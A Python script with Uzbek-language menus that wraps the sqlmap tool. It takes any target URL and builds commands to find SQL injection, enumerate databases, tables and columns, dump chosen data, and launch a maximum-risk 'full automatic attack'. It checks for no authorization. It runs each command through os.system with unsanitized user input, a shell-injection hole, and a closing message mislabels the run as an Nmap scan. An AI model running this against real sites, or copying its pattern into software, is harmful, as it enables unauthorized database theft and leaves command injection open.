#!/usr/bin/python

import os
from termcolor import colored


def banner():
    os.system("clear")
    print(colored(r"""
                                                                                   ^                      
                                                                                 J@@M                     
                                                                        ^         @@@@^                   
                                                                     ;@@@>         J@@@                   
                                                                      ;@@@J      ;j j@@@}                 
                                                                       ^@@@O  ^J@@@@^;@@@}                
                                                                   >@@@; @@@@^;@@@@@> ;@@@O               
                                                                >j _@@@@j p@@@^;@|      @@@>              
                                                              }@@@@  @@@@j J@@@>                          
                                                          ^a@@ _@@@@;_@@@@a }@@@>                         
                                                       ^} v@@@@^;@@@@@@@@@@@ >@@@v                        
                                                     |@@@@ ^@@@@J@@@@@@@@@@@@;^@@@J                       
                                                  J@M }@@@@ _@@@@@@@@@@@@@@j    @@j                       
                                               ; v@@@@ >@@@@@@@@@@@@@@@@j                                 
                                            ^@@@@ ;@@@@v@@@@@@@@@@@@@j^                                    
                                            a@@@@@ >@@@@@@@@@@@@@@a                                       
                                            |@@@@@@@@@@@@@@@@@@J                                          
                                          |a ;@@@@@@@@@@@@@@a;                                            
                                         @@@@ ;@@@@@@@@@@@;                                               
                                        |@@@@@> @@@@@@@>                                                  
                                     }@@@pO@MJ   >pp_                                                     
                                  ;@@@a                                                                   
                               ;@@@p;                                                                     
                            >p@@M>                                                                        
                           }@@>                                                                           
    """, "cyan"))


def validate_url(url):
    return url.startswith("http://") or url.startswith("https://")


def run_sqlmap():
    while True:
        banner()
        print(colored("SQLMap vositasi orqali SQL injektsiya tekshiruvi", "yellow"))

        target = input("\n🎯 Maqsadli URL'ni kiriting (masalan: http://testphp.vulnweb.com): ").strip()
        if not validate_url(target):
            print(colored("❌ URL noto'g'ri. http:// yoki https:// bilan boshlanishi kerak.", "red"))
            input("\n⏎ Davom etish uchun Enter tugmasini bosing...")
            continue

        while True:
            print(colored("\nQuyidagilardan birini tanlang:", "cyan"))
            print("1. Zaifliklarni topish")
            print("2. Ma'lumotlar bazasi nomlarini aniqlash")
            print("3. Jadval nomlarini aniqlash")
            print("4. Ustun nomlarini aniqlash")
            print("5. Ma'lumotlarni chiqarish (dump)")
            print("6. To‘liq avtomatik hujum")
            print("0. Ortga (main menyuga) qaytish")

            choice = input("\nTanlovni kiriting: ").strip()

            if choice == "1":
                command = f"sqlmap -u '{target}'"

            elif choice == "2":
                command = f"sqlmap -u '{target}' --dbs"

            elif choice == "3":
                db_name = input("🗃 Ma'lumotlar bazasi nomi: ").strip()
                if not db_name:
                    print(colored("❌ Ma'lumotlar bazasi nomi bo'sh bo'lishi mumkin emas.", "red"))
                    continue
                command = f"sqlmap -u '{target}' -D '{db_name}' --tables"

            elif choice == "4":
                db_name = input("🗃 Ma'lumotlar bazasi nomi: ").strip()
                table_name = input("📋 Jadval nomi: ").strip()
                if not db_name or not table_name:
                    print(colored("❌ Maydonlar bo'sh bo'lishi mumkin emas.", "red"))
                    continue
                command = f"sqlmap -u '{target}' -D '{db_name}' -T '{table_name}' --columns"

            elif choice == "5":
                db_name = input("🗃 Ma'lumotlar bazasi nomi: ").strip()
                table_name = input("📋 Jadval nomi: ").strip()
                column_name = input("📌 Ustun nomi: ").strip()
                if not db_name or not table_name or not column_name:
                    print(colored("❌ Hamma maydonlar to‘ldirilishi kerak.", "red"))
                    continue
                command = f"sqlmap -u '{target}' -D '{db_name}' -T '{table_name}' -C '{column_name}' --dump"

            elif choice == "6":
                command = f"sqlmap -u '{target}' --batch --risk=3 --level=5"

            elif choice == "0":
                print(colored("\n🔙 Asosiy menyuga qaytilmoqda...", "green"))
                return

            else:
                print(colored("❌ Noto'g'ri tanlov. Faqat 1–6 oralig'idagi raqamlarni tanlang.", "red"))
                continue

            os.system(command)

            again = input("\n🔁 Shu IP/domen uchun yana skanerlashni xohlaysizmi? (yes/no): ").lower()
            if again != "yes":
                break
        back = input("\n⬅  Boshqa IP/domenni skanerlashni xohlaysizmi? (yes/no): ").lower()
        if back != "yes":
            print("🔚 Nmap skanerlash tugatildi. Asosiy menyuga qaytilmoqda...\n")
            from main import main
            return main()
